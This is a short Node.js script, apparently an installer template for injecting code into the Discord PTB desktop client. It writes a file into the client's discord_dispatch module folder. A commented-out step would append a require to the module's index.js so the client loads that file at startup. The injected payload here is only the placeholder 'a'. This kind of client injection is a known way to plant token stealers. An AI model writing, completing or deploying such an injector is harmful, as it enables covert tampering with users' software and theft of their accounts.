var fs = require('fs');

var d45197b50ccc = `a`

var appver = fs.readdirSync(process.env.LOCALAPPDATA + "/DiscordPTB/").filter(fn => fn.startsWith('app-'));

fs.writeFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + appver + "/modules/discord_dispatch-1/discord_dispatch" + "/loadscripts.js", d45197b50ccc, function (err) {
  if (err) throw err;
  console.log('Installed!');
});

/*fs.appendFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + appver + "/modules/discord_dispatch-1/discord_dispatch" + "/index.js", 'require(./loadscripts.js)', function (err) {
  if (err) throw err;
  console.log('Linked!');
});*/
